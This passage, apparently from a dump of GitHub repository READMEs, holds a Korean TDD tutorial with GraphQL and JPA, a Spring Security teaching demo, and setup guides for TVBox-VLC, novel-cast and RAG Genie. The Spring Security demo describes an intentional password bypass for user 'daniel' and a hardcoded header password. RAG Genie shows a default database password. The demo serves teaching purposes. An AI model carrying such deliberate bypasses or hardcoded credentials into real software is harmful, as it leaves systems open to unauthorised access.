                new CreateGoodsCollection.CreateGoodsCollectionRequest(
                        ""Collection 1"",
                        List.of(""GD00112296"", ""GD00112297"", ""9000000112298"", ""9000000112299"")));
        assertThat(newlyCreatedId).isGreaterThan(0L);
        Approvals.verify(
                Neutralizer.localDateTime( // LcoalDateTime 형식 문자열을 지정된 문자열로 치환하여 시간 변경을 무력화
                        YamlPrinter.printWithExclusions( // YAML 형식으로 데이터를 출력하는데 ""id"" 필드는 제외함
                                findById(newlyCreatedId).get(), ""id"")
                )
        );
    }

    private Optional<GoodsCollection> findById(Long id) {
        return Optional.ofNullable(goodsCollectionMap.get(id));
    }

    private Long createGoodsCollection(CreateGoodsCollection.CreateGoodsCollectionRequest request) {
        GoodsCollection goodsCollection = new GoodsCollection(request.name(), userId());
        List<Goods> goodsList = findGoodsByIds(request.ids());
        for (Goods goods : goodsList) {
            goodsCollection.addItem(new GoodsCollectionItem(goods));
        }
        save(goodsCollection);
        return goodsCollection.getId();
    }

    private void save(GoodsCollection goodsCollection) {
        goodsCollection.setId(goodsCollectionId.getAndIncrement());
        goodsCollectionMap.put(goodsCollection.getId(), goodsCollection);
    }

    private List<Goods> findGoodsByIds(List<String> ids) {
        return goodsMap.values().stream()
                .filter(goods -> ids.contains(goods.goodsId()) || ids.contains(goods.barcode()))
                .sorted(Comparator.comparing(Goods::goodsId)) // DB 쿼리와 정렬 순서를 맞추기 위해
                .toList();
    }

    private Long userId() {
        return 1L;
    }
}
```

#### Extract Delegate in-memory repository

- slide methods
- extract delegate repository

    - ![img.png](extract-delegate-in-memory-repository.png)

#### Extract Repository Interface

- ![img.png](extract-interface-repository.png)

- **테스트 작성 시점에 Repository Interface를 먼저 정하는 것이 좋을수도**
    - in memory repository의 인터페이스가 부적합해 질 수 있음
        - JPA 등을 사용하기게 부적합할 수도
    - 테스트를 작성하는 시점에 협력 객체들과 인터페이스를 점진적으로 발견하는 것도 중요

#### move instance method from test to model

- move createGoodsCollection method from test to model
- move GoodsCollectionInMemoryRepository from test to model

### make acceptance test work using DI

```java

@Profile(""in-memory"")
@Repository
public class GoodsCollectionInMemoryRepository implements GoodsCollectionRepository
```

#### add approvaltests using findById

```java
    Approvals.verify(
        Neutralizer.localDateTime(
        YamlPrinter.printWithExclusions(repository.findById(result).

get(), ""id"")));
```

## 행위 추가하기 - 상품군 조회하기

### Acceptance Test(인수 테스트) - Outer TDD

#### Query 스키마 추가하기

```graphql
type Query {
    listGoodsCollection( request: SearchDto = { sort: { by: createdAt, direction: desc } } ): GoodsCollectionSlice
}

type GoodsCollectionSlice {
    totalElements: Int
    content: [GoodsCollectionDto]
}

type GoodsCollectionDto {
    id: ID!
    name: String!
    createdBy: Int!
    createdAt: String!
    updatedBy: Int
    updatedAt: String
    goodsCollectionItems: [GoodsCollectionItemDto]
}

type GoodsCollectionItemDto {
    goodsNo: Int!
    goodsId: String!
    barcode: String
}

input SearchDto {
    keyword: String = """"
    type: String = ""name""
    page: Int = 0
    size: Int = 20
    sort: Sort = { by: createdAt, direction: desc }
}

input Sort {
    by: SortBy = createdAt
    direction: SortDirection = desc
}

enum SortBy {
    createdAt
    barcode
    id
    name
}

enum SortDirection {
    asc
    desc
}

scalar BigDecimal
scalar Date
scalar DateTime
```

#### add acceptance test

```java

@Test
public void listGoodsCollection() throws Exception {
    String queryString = """"""
             query {
               listGoodsCollection(request: {
                 keyword: ""Collection 0"",
                 type: ""type"",
                 page: 0,
                 size: 10
               }) {
                 content {
                   id
                   name
                   createdBy
                   createdAt
                   goodsCollectionItems {
                     goodsNo
                     goodsId
                     barcode
                   }
                 }
               }
            }
             """""";

    List<GetGoodsCollection.GoodsCollectionDto> result = request(queryString, ""listGoodsCollection.content"")
            .entityList(GetGoodsCollection.GoodsCollectionDto.class)
            .get();
    Approvals.verify(Neutralizer.localDateTime(YamlPrinter.printWithExclusions(result, ""updatedBy"", ""updatedAt"")));
}
```

#### make it work with dummy

```java
public class GetGoodsCollection {
    private final GoodsCollectionRepository repository;

    @QueryMapping(""listGoodsCollection"")
    public Page<GoodsCollectionDto> listGoodsCollection(@Argument final SearchDto request) {
        return new PageImpl<>(Collections.emptyList(), PageRequest.of(request.page(), request.size()), 0);
    }

    record GoodsCollectionDto(String name, Long createdBy, LocalDateTime createdAt, Long updatedBy,
                              LocalDateTime updatedAt, List<GoodsCollectionItemDto> goodsCollectionItems) {
    }

    record GoodsCollectionItemDto(Long goodsNo, String goodsId, String barcode) {
    }
}
```

- SeachDto

```java
public record SearchDto(String type, String keyword, Integer page, Integer size, SortDto sort) {
    public String sortBy() {
        return sort().by();
    }

    public String sortDirection() {
        return sort().direction();
    }

    public Pageable pageable() {
        return PageRequest.of(page(), size());
    }

    public int offset() {
        return page * size;
    }

    public boolean isAscending() {
        return ""asc"".equals(sortDirection());
    }

    public Pageable pageableWithSort() {
        Sort sort = isAscending() ?
                Sort.by(Sort.Order.asc(sortBy()))
                : Sort.by(Sort.Order.desc(sortBy()));
        return PageRequest.of(page(), size(), sort);
    }
}

record SortDto(String by, String direction) {
}
```

### Inner TDD

- 이번에는 바로 Application Service에서 구현해 보자

```java
public class GetGoodsCollection {
    private final GoodsCollectionRepository repository;

    @QueryMapping(""listGoodsCollection"")
    public Page<GoodsCollectionDto> listGoodsCollection(@Argument final SearchDto request) {
        List<GoodsCollection> goodsCollections = repository.findByNamingContaining(request.keyword(), request.pageableWithSort());
        List<GoodsCollectionDto> result = goodsCollections.stream()
                .map(GoodsCollectionDto::from)
                .toList();
        return new PageImpl<>(result, PageRequest.of(request.page(), request.size()), result.size());
    }

    record GoodsCollectionDto(Long id, String name, Long createdBy, LocalDateTime createdAt, Long updatedBy,
                              LocalDateTime updatedAt, List<GoodsCollectionItemDto> goodsCollectionItems) {
        public static GoodsCollectionDto from(GoodsCollection goodsCollection) {
            List<GoodsCollectionItemDto> itemDtoList = goodsCollection.getGoodsCollectionItems().stream()
                    .map(GoodsCollectionItemDto::from)
                    .toList();
            return new GoodsCollectionDto(goodsCollection.getId(), goodsCollection.getName(), goodsCollection.getCreatedBy(), goodsCollection.getCreatedAt(), goodsCollection.getUpdatedBy(), goodsCollection.getUpdatedAt(), itemDtoList);
        }
    }

    record GoodsCollectionItemDto(Long goodsNo, String goodsId, String barcode) {
        public static GoodsCollectionItemDto from(GoodsCollectionItem goodsCollectionItem) {
            return new GoodsCollectionItemDto(goodsCollectionItem.getGoodsNo(), goodsCollectionItem.getGoodsId(), goodsCollectionItem.getBarcode());
        }
    }
}
```

- listGoodsCollection을 위한 최기 데이터 생성 로직(InMemory Repository) 추가

```java
    public GoodsCollectionInMemoryRepository() {
    createGoodsCollectionForList();
}

private void createGoodsCollectionForList() {
    GoodsCollection goodsCollection = new GoodsCollection(""Collection 0"", 1L);
    goodsCollection.setId(goodsCollectionId.getAndIncrement());
    goodsCollection.addItem(new GoodsCollectionItem(goodsMap.get(112296L)));
    goodsCollection.addItem(new GoodsCollectionItem(goodsMap.get(112297L)));
    goodsCollection.addItem(new GoodsCollectionItem(goodsMap.get(112298L)));
    goodsCollection.addItem(new GoodsCollectionItem(goodsMap.get(112299L)));
    goodsCollectionMap.put(goodsCollection.getId(), goodsCollection);
}

@Override
public List<GoodsCollection> findByNamingContaining(String keyword, Pageable pageable) {
    return goodsCollectionMap.values().stream()
            .filter(goodsCollection -> goodsCollection.getName().contains(keyword))
            .toList();
}
```

## Implement Persistence Layer

- Repository 클래스 다이어그램
    - 개념 모델
      ![repo-hierarchy.png](repo-hierarchy.png)
    - 구현 모델
      ![repo-hierarch.jpg](repo-hierarch.jpg)
        - 순수한 GoodsCollectionRepository에 원하는 기능을 정의
        - InMemory 구현은 Map등을 이용
        - JPA 매핑을 해야 하는 시점에는
            - JpaRepository 추가
                - JpaRepository는 인터페이스 형식이지만
                - spring에서 내부적으로 proxy를 생성해서 구현체를 제공
            - Abstract 구현 추가
                - JPA를 이용한는 기능은 모두 JpaRepository에 위임
            - Repository 구현
                - Abstract Repository를 상속
                - Abstract에서 구현하지 않은 메서드만 구현
- jpa mapping
    - GoodsCollection
      ```java
      @NoArgsConstructor
      @Getter
      @Entity
      public class GoodsCollection {
          @Id
          @GeneratedValue(strategy = GenerationType.IDENTITY)
          private Long id;
          private String name;
          private Long createdBy;
          private LocalDateTime createdAt;
          private Long updatedBy;
          private LocalDateTime updatedAt;
          @OneToMany(mappedBy = ""goodsCollection"", cascade = CascadeType.ALL, orphanRemoval = true, fetch = FetchType.EAGER)
          private List<GoodsCollectionItem> goodsCollectionItems = new ArrayList<>();
          // ...
      ```
        - GoodsCollectionItem
      ```java
      @Getter
      @NoArgsConstructor
      @Entity
      public class GoodsCollectionItem {
          @Id
          @GeneratedValue(strategy = GenerationType.IDENTITY)
          private Long id;
          private Long goodsNo;
          private String goodsId;
          private String barcode;
          @JsonIgnore
          @ManyToOne
          @JoinColumn(name = ""GOODS_COLLECTION_ID"", nullable = false)
          private GoodsCollection goodsCollection;
          // ...
      ```
- add repository classes
    - AbstractGoodsCollectionRepository
      ```java
      @RequiredArgsConstructor
      public abstract class AbstractGoodsCollectionRepository implements GoodsCollectionRepository {
          private final GoodsCollectionJpaRepository jpaRepository;
  
          @Override
          public Optional<GoodsCollection> findById(Long id) {
              return jpaRepository.findById(id);
          }
  
          @Override
          public GoodsCollection save(GoodsCollection goodsCollection) {
              return jpaRepository.save(goodsCollection);
          }
  
          @Override
          public List<GoodsCollection> findByNamingContaining(String keyword, Pageable pageable) {
              return jpaRepository.findByNameContaining(keyword, pageable);
          }
      }
      ```
        - GoodsCollectionJpaRepository
      ```java
      public interface GoodsCollectionJpaRepository extends JpaRepository<GoodsCollection, Long> {
          List<GoodsCollection> findByNameContaining(String keyword, Pageable pageable);
      }
      ```
        - GoodsCollectionRepositoryImpl
      ```java
      @Profile(""prod"")
      @Repository
      public class GoodsCollectionRepositoryImpl extends AbstractGoodsCollectionRepository {
      @PersistenceContext
      private EntityManager em;
  
          public GoodsCollectionRepositoryImpl(GoodsCollectionJpaRepository jpaRepository) {
              super(jpaRepository);
          }
  
          @Override
          public List<Goods> findGoodsByIds(List<String> ids) {
              List<Object[]> resultList = em.createNativeQuery(""""""
                              select g.goods_no goodsno, g.goods_id as goodsid, g.barcode as barcode
                               from goods g
                                where (g.goods_id in :ids)
                                or (g.barcode in :ids)
                                order by g.goods_no
                  """""").setParameter(""ids"", ids).getResultList();
              return resultList.stream()
                      .map(result -> Goods.of((Object[]) result))
                      .toList();
          }
      }
      ```
- seed data
    - GOODS.sql
      ```sql
      create table if not exists goods
      (
          goods_no bigint comment '상품no' primary key,
          goods_id varchar(20)              null comment '상품id',
          barcode  varchar(100)             null comment '바코드'
      );
      delete from goods_collection_item where 1 = 1;
      delete from goods_collection where 1 = 1;
      delete from goods where 1 = 1;
      insert into goods (goods_no, goods_id, barcode) values (112296, 'GD00112296', '9000000112296') on duplicate key update goods_id=values(goods_id), barcode=values(barcode);
      insert into goods (goods_no, goods_id, barcode) values (112297, 'GD00112297', '9000000112297') on duplicate key update goods_id=values(goods_id), barcode=values(barcode);
      insert into goods (goods_no, goods_id, barcode) values (112298, 'GD00112298', '9000000112298') on duplicate key update goods_id=values(goods_id), barcode=values(barcode);
      insert into goods (goods_no, goods_id, barcode) values (112299, 'GD00112299', '9000000112299') on duplicate key update goods_id=values(goods_id), barcode=values(barcode);
      insert into goods (goods_no, goods_id, barcode) values (112300, 'GD00112300', '9000000112300') on duplicate key update goods_id=values(goods_id), barcode=values(barcode);
      insert into goods (goods_no, goods_id, barcode) values (112301, 'GD00112301', '9000000112300') on duplicate key update goods_id=values(goods_id), barcode=values(barcode);
      insert into goods (goods_no, goods_id, barcode) values (112303, 'GD00112303', '9000000112303') on duplicate key update goods_id=values(goods_id), barcode=values(barcode);
      insert into goods (goods_no, goods_id, barcode) values (112304, 'GD00112304', '9000000112304') on duplicate key update goods_id=values(goods_id), barcode=values(barcode);
      insert into goods (goods_no, goods_id, barcode) values (112306, 'GD00112306', '9000000112306') on duplicate key update goods_id=values(goods_id), barcode=values(barcode);
      insert into goods (goods_no, goods_id, barcode) values (112307, 'GD00112307', '9000000112307') on duplicate key update goods_id=values(goods_id), barcode=values(barcode);
      ```
    - GOODS_COLLECTION.sql
      ```sql
      delete from goods_collection_item where 1 = 1;
      delete from goods_collection where 1 = 1;
      INSERT INTO goods_collection (created_at, created_by, id, updated_at, updated_by, name) VALUES ('2024-04-07 21:40:58.095256', 1, 1, null, null, 'Collection 0');
      INSERT INTO goods_collection_item (goods_collection_id, goods_no, id, barcode, goods_id) VALUES (1, 112296, 1, '9000000112296', 'GD00112296');
      INSERT INTO goods_collection_item (goods_collection_id, goods_no, id, barcode, goods_id) VALUES (1, 112297, 2, '9000000112297', 'GD00112297');
      INSERT INTO goods_collection_item (goods_collection_id, goods_no, id, barcode, goods_id) VALUES (1, 112298, 3, '9000000112298', 'GD00112298');
      INSERT INTO goods_collection_item (goods_collection_id, goods_no, id, barcode, goods_id) VALUES (1, 112299, 4, '9000000112299', 'GD00112299');
      ```
    - seed data는 in memory에서 사용하는 데이터와 동일하게

## Packaging

- persistence, domain으로 나누어 패키징

## 얻은 점들

### 전체적인 흐름(Inner and outer feedback loops in TDD)

![img.png](Inner-and-outer-feedback-loops-in-TDD.png)

-
from [Growing Object-Oriented Software, Guided by Tests: Freeman, Steve, Pryce, Nat: 9780321503626: Amazon.com: Books](https://www.amazon.com/Growing-Object-Oriented-Software-Guided-Tests/dp/0321503627)

- Outer TDD
    - 구현 완료를 확인할 수 있는 인수 테스트를 먼저 작성
    - 실제 DB와 GraphQl Controller, JPA 등을 사용
- Inner TDD
    - 하나의 인수 테스트를 통과하기 위해 필요한 기능을 구현
    - InMemory Repository를 사용
- 기능을 적절한 곳에 배치하는 순서
    - 최초엔 Test 클래스에 **설계를 고려하지 않고 빠르게 절차적으로 구현해서 동작하도록 만들기**
        - 기능 구현을 완료해 봐야만 **문제를 정확히 이해** 가능
        - 구현 중에 **발생 가능한 이슈**를 사전에 예측하기 어려움
    - **Test 클래스 → InMemory Repository, Application Service → Application Service -> domain**
        - **SoC**
        - **split by levels of abstraction**
        - **split unrelated complexity**(by fixture conflict)
    - Test에서 Domain Service로 추출할 로직, Application Serivce로 추출할 로직을 미리 분리하지 말아야
        - Applicaton Service로 추출 후 Domain Service로 추출하는 것이 더 쉬움
    - [빵구조](https://msbaek.github.io/codetemplate/terms.html#functional-core-imperative-shell) 지향
    - 최초 테스트에 모든 구현을 해서 빠르고 집중해서 진행 가능
- 기능 구현을 모두 마친 후에 JPA Mapping
    - InMemory Repository를 JPA Repository로 변경
    - 이 부분에서 **매우 부드럽게 완료**되었음
    - 위 Repository 클래스 다이어그램 참조

### 순수한 Repository(GoodsCollectionRepository)를 사용하는 잇점

- JPA 매핑을 초기에 하면
    - JPA Repository, DB에 의존하게 됨
    - 느림
    - Stubbing이 어려움. 많은 메소드를 Stubbing해야 함
    - Duct Tape Programming에 부적합
    - Entity 마다 JPA Repository를 생성하는 경향 발생
        - Aggregate에 동작하는 Repository를 보기 어려움
    - JPA Repository에 manual한 구현이 필요한 경우 대응이 어려움
        - ex. GOODS처럼 JPA 매핑이 어려운 레거시 테이블을 다뤄야 할 때
    - 구현 초기에 JPA 매핑을 하면 너무 일찍 구현에 의존하게 됨
- 대개의 경우 리팩터링을 일찍하는 경우가 많은데 JPA를 적용하면 롤백도 어렵고, 더 느려짐

### In Memory Repository를 이용해서 개발 후 부드럽게 영속 계층 구현하기

- 모든 기능을 InMemory Repository로 구현하고, 이후 JPA Repository로 변경했는데 In Memory Repository를 사용해서 테스트를 성공시킬 때 사용한 검증데이터(xxx
  approved.txt)를 영속 계층을 구현한 후에도 변경 없이 사용할 수 있어서 부드럽게 진행이 되었음

### ApprovalsTest

- UI를 보고 확인하는 효과를 줌
  ```yaml
  ---
  name: ""Collection 1""
  createdBy: 1
  createdAt: ""2003-05-03T10:11:12.134567""
  goodsCollectionItems:
    - goodsNo: 112296
      goodsId: ""GD00112296""
      barcode: ""9000000112296""
    - goodsNo: 112297
      goodsId: ""GD00112297""
      barcode: ""9000000112297""
    - goodsNo: 112298
      goodsId: ""GD00112298""
      barcode: ""9000000112298""
    - goodsNo: 112299
      goodsId: ""GD00112299""
      barcode: ""9000000112299""
  ```
- 회사에서 사용 중인 YamlPrinter, Neutralizer 등을 이용해서 포커싱해야 하는 정보만 확인
- 꼭 필요한 정보만 보여줘서 가독성을 높게

## 참고자료

- [Vertical Slice Architecture - Jimmy Bogard](https://www.jimmybogard.com/vertical-slice-architecture/)
- [Vertical Slicing Architectures - Victor Rentea](https://www.youtube.com/watch?v=H7HWOlANX78&list=WL&index=27&t=34s)","Vertical Slicing Architecture, TDD, GraphQL, JPA 등을 이용한 웹 어플리케이션 예제",,2024-04-08T08:36:58Z,2024-05-12T12:20:27Z,,0,1,0,35,0,2,72,2,0,,Java
Kehrlann/spring-security-the-good-parts,main,"# spring-security-the-good-parts-code

Code for ""Spring Security: The Good Parts""

## Demo scenario


### Step 1: A Boot app, with no security

We create a `/public` and `/private` page. No security is applied.

The `/private` page has some tricks to show a logout button ... if some `_csrf` token is available.
It's not the case yet, it will be injected by Spring Security later on. When you think about it, it
makes sense: you can't ""log in"", so you shouldn't be able to ""log out"" either.

### Step 2: Basic Spring-Security setup

We introduce Spring Security. We create a `SecurityConfig` configuration class, where we will store
all of our security-related configuration customizations.

The first customization is to create a custom SecurityFilterChain, to override the defaults that
Spring Boot give us. We make sure that every request must be authenticated, except the few things
that we deem ""public"", such as `/` (public page), the favicon, the css resources, etc. We also
introduce `.formLogin()` to ensure form login is enabled for us.

We also introduce our own UserDetailsService, because we don't want to have to copy the random
password that Boot generates every time we boot up the app. It's an in-memory implementation, for
demo purposes.

Finally, we leverage the `Authentication` object that Spring Security creates for us to display the
name of the logged-in user.

### Step 3: Add SSO, with oauth2-login

We add the dependencies and the code to make SSO login work. It requires adding some properties, and
just enabling ""oauth2 login"" in our previous security configuration. Everything stays the same.

We want a nicer ""authentication name"" when logged in with Google, rather than the ID we get back, so
we tweak our GreetingController to display the e-mail when doing SSO login.

### Step 4: Our first Filter

We create our first Filter, the `ForbiddenFilter`. It sets the response code to 403 (Forbidden), with
an error message, when the `x-forbidden: true` header is present. Otherwise it's a no-op.

We register it in our filter chain. We can register before any filter we know. It is usally
recommended to register it at least before `AuthorizationFilter`, which is the filter that does the
checks for `http.authorizeHttpRequests`.

You can see the results, e.g. using HTTPie or cURL:

```shell
$ curl localhost:8080 -H ""x-forbidden: true"" -v
$ # or
$ http localhost:8080 x-forbidden:true
```

### Step 5: RobotAuthenticationFilter

We create a filter that authenticates the user. In this case, it's a ""robot account"" that sends us a
secret password in the `X-Robot-Password` header.

If the header is present, we make sure the password is correct. If the password is incorrect, we
reject the request. If the password is fine, we perform the actual authentication by creating an
instance of an appropriate implementation of the `Authentication` interface.

If the header is absent, we let the rest of the filter chain decide what to do.

See:

```shell
$ curl localhost:8080/private -H ""x-robot-password: beep-boop""
$ # or
$ http localhost:8080/private x-robot-password:beep-boop
```

### Step 6: Our first AuthenticationProvider, because user ""daniel"" is _special_

We create an AuthenticationProvider that will let user ""daniel"" in, no matter the password.

We also turn on HTTP Basic authentication - and we don't have to do anything to grant the same
rights to ""daniel"".

See:

```shell
$ curl localhost:8080/private -u ""daniel:foobar""
$ # or
$ http localhost:8080/private --auth ""daniel:barfoo""
```

This leverages the `ProviderManager`, which, for examples, produces Spring events when a login
succeeds or fails. We listen to `AuthenticationSuccessEvents` and do a System.out.println with the
Authentication class and the Authentication name. Notice how RobotAuthentications are _not_ logged,
as they happen directly in a filter, without using an AuthenticationManager.

### Step 7: Rework the RobotAuthenticationFilter to use AuthenticationManager

We make sure the RobotAuthenticationFilter actually uses an Authentication Manager, like the rest of
Spring Security. To do this, we need to create an ""unauthenticated"" version of the
RobotAuthentication. We also need an AuthenticationProvider to handle those RobotAuthentication.

To get an AuthenticationManager, we access the Filter chain's local AuthenticationManager. See
the [Spring Security without the WebSecurityConfigurerAdapter blog post](https://spring.io/blog/2022/02/21/spring-security-without-the-websecurityconfigureradapter),
which talks about how to access that class. We create a bespoke AbstractHttpConfigurer and put all
Robot-related configuration in the class, so we can get the authentication manager.

### Step8: Rework the RobotAuthenticationFilter to extend AuthenticationFilter

Most `Authentication` filters in Spring Security can be written as an `AuthenticationFilter`
sublclass. It follows a simple ""composition"" pattern, where you declard an
`AuthenticationConverter`, an `AuthenticationManager`, and both success and failure handlers. The
wiring is then done by the base class, which does:

1. HttpRequest -> [AuthenticationConverter] -> Authentication
2. Authentication -> [AuthenticationManager] -> Authentication in the SecurityContext (if succesful)
3. Authentication(Exception) -> [Authentication(Success|Failure)Handler]
",Spring Security: The Good Parts™ - a demo of how Spring Security is architectured,,2024-04-08T08:13:31Z,2024-06-27T08:57:52Z,,0,1,1,12,0,18,72,3,0,Apache-2.0,Java
skycn-mi2/TVBox-VLC,master,">本代码从tvbox-osc获取并在此基础上进行了修改，移除了IJK、EXO、THUNDER等。
本代码非完整版，不可用于构建。
## 1 源码说明
- Spider可以参考：https://github.com/CatVodTVOfficial/CatVodTVSpider/
- tvbox-osc可以参考：https://github.com/windwang/tvbox
- LIBVLC可参考：https://github.com/videolan/vlc-android

## 2 直播源
参阅liveconfig\live_latest_public.txt文件，从网络收集，依照个人喜好整理分类，不定期更新，不保证时效。

## 3 系统要求
鉴于Libvlc版本，支持安卓5.0 SDK21+，安卓4及以下暂无支持计划

## 3 感谢
感谢各开源项目作者。非专业安卓开发人员，依个人喜好及个人需求定制优化。

","基于TVBOX,引入LIBVLC,移除IJK/EXO/THUNDER",,2024-04-08T11:34:12Z,2024-05-09T07:42:15Z,2024-05-09T07:42:15Z,4,1,0,27,1,6,67,1,0,AGPL-3.0,Java
zddgg/novel-cast,main,"# 本项目不再维护，新项目[aigc-server](https://github.com/zddgg/aigc-platform-server)，全新UI及交互，欢迎关注。


# novel-cast
### 一个小说多角色自动化AI配音程序
1. 角色分析：kimi
2. 音频生成：GPT-SoVITS
3. 示例音频素材：来源于B站 `白菜工厂1145号员工`

## 运行前准备
1. kimi api key
2. GPT-SoVITS api

## 分支说明
### 主分支以及gsv-base分支的gpt-sovits接口是api.py
### gsv-fast-inference的gpt-sovits接口是它的快速推理分支api_v2.py

## 运行程序
### 编译后的程序运行
1. 下载压缩包 网盘 (https://pan.quark.cn/s/93450e54d99c) 。
2. 打开压缩包，修改 `application.yaml` 文件中的 `kimi api key` 和 `GPT-SoVITS api`
3. 运行 `启动.bat`
4. 浏览器打开 `127.0.0.1:8080`

1. 技术栈 
jdk21, springboot3, vue3, ffmpeg
2. 项目结构
```
D:
└─novelCast
    ├─模型
    │  ├─语音
    │  │  ├─原神
    │  │  │  ├─迪卢克
    │  │  │  │  └─默认
    │  └─配置
    └─项目

```
",,,2024-04-23T18:34:05Z,2024-06-21T13:10:27Z,,0,1,0,33,4,12,67,3,0,MIT,Java
stephanj/rag-genie,master,"# RAG Genie

## About

The RAG Genie, an LLM RAG prototype to test and evaluate your embeddings, chunk splitting strategies using Q&A and evaluations. 

https://github.com/stephanj/rag-genie/assets/179457/e154a2ba-b031-4c62-adb4-fc87c7d448da

## Contribute

To contribute to this project, please read the [contribution guidelines](CONTRIBUTING.md).
Also make sure to read the [translation guidelines](TRANSLATION.md) if you want to contribute to the translations.

## Useful links

* [ChangeLog](CHANGELOG.md)
* [Github project](https://github.com/stephanj/rag-genie/)

## Configure your development environment

### Install Taskfile.dev

Taskfile is a task runner / build tool that aims to be simpler and easier to use than, for example, GNU Make.

If you're on macOS or Linux and have [Homebrew](https://brew.sh/) installed, just run:

    brew install go-task

Otherwise, you can follow the [installation instructions](https://taskfile.dev/installation/) for your platform.

You can list all available tasks with:

    > task

    task: Available tasks for this project:

    * clean:                                🧽 Clean generated code and binaries
    * default:                              📝 List all tasks
    * genie:backend:start:                  🏃 Start Genie Spring Boot backend
    * genie:backend:start:prod:             🏃 Start Genie Spring Boot backend in production mode
    * genie:build:                          🏗️ Build the app (tests are skipped) (aliases: build)
    * genie:build:prod:                     🏗 Build the app (tests are skipped) in production mode
    * genie:frontend:build:                 🏗️ Build Genie Node/Angular frontend
    * genie:frontend:start:                 🏃 Start Genie Node/Angular frontend
    * genie:frontend:sync:                  👀 Build Genie Node/Angular frontend in watch mode
    * genie:release:                        📦 Release a new Genie version (automatically selected)                      (aliases: release)
    * genie:release:alpha:                  📦 Release a new Genie pre-release alpha version                             (aliases: release:alpha)
    * genie:release:beta:                   📦 Release a new Genie pre-release beta version                              (aliases: release:beta)
    * genie:release:major:                  📦 Release a new Genie major version                                         (aliases: release:major)
    * genie:release:minor:                  📦 Release a new Genie minor version                                         (aliases: release:minor)
    * genie:release:patch:                  📦 Release a new Genie patch version                                         (aliases: release:patch)
    * genie:start:                          🏃 Start Genie                                                               (aliases: start)
    * genie:start:prod:                     🏃 Start Genie locally in production mode (triggers a full clean build)      (aliases: start:prod)
    * genie:test:                           ✅ Test the app                                                              (aliases: test)
    * clean:full:                           🧽 Clean generated code, binaries including Node and its modules
    * db:drop:                              🧽 Stop and remove all services data (PostgreSQL)
    * db:dump:                              ⬇️ Dump data from local PostgreSQL instance
    * db:import:                            ⬆️ Import data into local PostgreSQL instance
    * db:liquibase:clear-checksums:         🧽 Clear Liquibase checksums
    * db:liquibase:update:                  ⚙️ Update local database with Liquibase changes
    * db:liquibase:validate:                ☑️ Validate local database with Liquibase changes
    * db:restart:                           🔄 Restart PostgreSQL db
    * db:start:                             🏃 Start PostgreSQL db
    * db:status:                            🚦 PostgreSQL db status
    * db:stop:                              🛑 Stop PostgreSQL db
    * env:setup:                            🛠️ Setup the project environment
    * env:verify:                           ☑️ Verify the project environment setup

If you want to see the commands executed by a task, you can use the `--dry-run` option:

    task --dry genie:build

### Verify your environment

To verify your environment is compatible with the project, run the following command:

    task env:verify

### Setup your environment

You can manually setup your environment by following feedback from the `env:verify` task 
or you can run the following command to let us doing the setup:

    task env:setup

The script will install all required tools and dependencies and supports the following package managers:

* [ASDF](https://asdf-vm.com/) - preferred when available as it supports a large set of tools and versions
* [SDKMAN](https://sdkman.io/) - used when ASDF is not available to setup Java
* [Homebrew](https://brew.sh/) - used when others are not available. It will change the default version of the required tools on your system which is why ASDF or SDKMAN are preferred.

## Build and execute automated tests

The project uses [Apache Maven](https://maven.apache.org/) as build tool and [JUnit 5](https://junit.org/junit5/) as test framework.

To build the project without running the tests, run the following command:

    task build

The application is packaged as a [Spring Boot](https://spring.io/projects/spring-boot) executable jar file.
You can find the jar file in the `target` directory, it is compiled in `dev` mode.

To build it in production mode, run the following command:

    task genie:build:prod

To build the project and execute the tests, run the following command:

    task test

## Run Locally

### Environment variables

First create a `.env` file in the root of the project by copying the sample file as follows:

    copy .env.example .env

Update the content of `.env` with the correct values provided by a project administrator.

You can also use `.env` to override the default values from `.env.default`.

You can pass to the application any configuration parameter as described in [Spring Boot documentation](https://docs.spring.io/spring-boot/docs/current/reference/html/features.html#features.external-config). 

One mandatory env variable is GENIE_SECURITY_KEY_SECRET which is used to encrypt the API keys into the database.

The length of this key should be 32 characters (for 256-bit key) to work correctly with the AES encryption algorithm.

The following command will create a 32 characters keys

```
openssl rand -base64 32
``` 

### Start Genie

To start the application, run the following command:

    task start

The application is available at [http://localhost:8080](http://localhost:8080).

Launch in dev mode with hot reload enabled.
Any change in the code will be automatically reloaded.
Frontend code is automatically compiled using [Webpack](https://webpack.js.org/) and **[LiveReload](https://chromewebstore.google.com/detail/livereload/jnihajbhpnppcggbcgedagnkighmdlei?hl=fr) is used to reload the page when any change is detected (just install the browser extension and enable it on the website).**
We also advise installing the [Angular DevTools](https://chromewebstore.google.com/detail/angular-devtools/ienfalfjdbdpebioblfackkekamfmbnh) extension to debug the Angular application.

### Production mode

To build and launch the application in production mode, run the following command:

    task start:prod

### Manage the local database manually

You can start it with:

    task db:start

Restart it with:

    task db:restart

Stop it with:

    task db:stop

Check its status with:

    task db:status

Drop its content with:

    task db:drop

Dump its content with:

    task db:dump

### Liquibase Usage

Liquibase is used to manage the database schema.

You can update the database schema with the following command:

    task db:liquibase:update

You can also validate the database schema with the following command:

    task db:liquibase:validate

You can clear the checksums so liquibase can update from a fresh start with the following command:

    task db:liquibase:clear-checksums

By default, liquibase-maven-plugin is configured to target the local DB defined as

    <liquibase.url>jdbc:postgresql://localhost:5432/postgres</liquibase.url>
    <liquibase.username>postgres</liquibase.username>
    <liquibase.password>mysecretpassword</liquibase.password>

#### Liquibase table updates

Make sure to use changesets to add new columns or indexes

for example

     <changeSet id=""20231019-1171"" author=""stephan"">

        <addColumn tableName=""genie_content"">
            <column name=""enable_tags"" type=""boolean"" defaultValue=""false"">
                <constraints nullable=""true"" />
            </column>
        </addColumn>
    </changeSet>

### Frontend environment

To build individual the frontend (in production mode), run the following command:

    task genie:frontend:build

And you can launch the frontend in dev mode with:

    task genie:frontend:start

Then you need to start the backend with the following command:

    task genie:backend:start

Use `npm` and `npx` wrappers to manually run any command like `./npm run start` or `./npx webpack`.

## Release a new version

To release a new version, run the following command:

    task release

The release automation:

* updates the version in the `pom.xml` file,
* updates the version in the `package.json`/`package-lock.json` file,
* updates the CHANGELOG.md file,
* commits the changes,
* tags the commit,
* proposes to push the commit and the tag to the remote repository.

`task release` is selecting the next version (`X.Y.Z`) based on changes since the last release.

It is following the [Conventional Commits](https://www.conventionalcommits.org/en/v1.0.0/) convention.

If there is a commit with a breaking change it will increase to the next major version (X) :

> **BREAKING CHANGE:** a commit that has a footer `BREAKING CHANGE:`, or appends a `!` after the type/scope, introduces a breaking API change (correlating with [**`MAJOR`**](http://semver.org/#summary) in Semantic Versioning). A BREAKING CHANGE can be part of commits of any _type_.

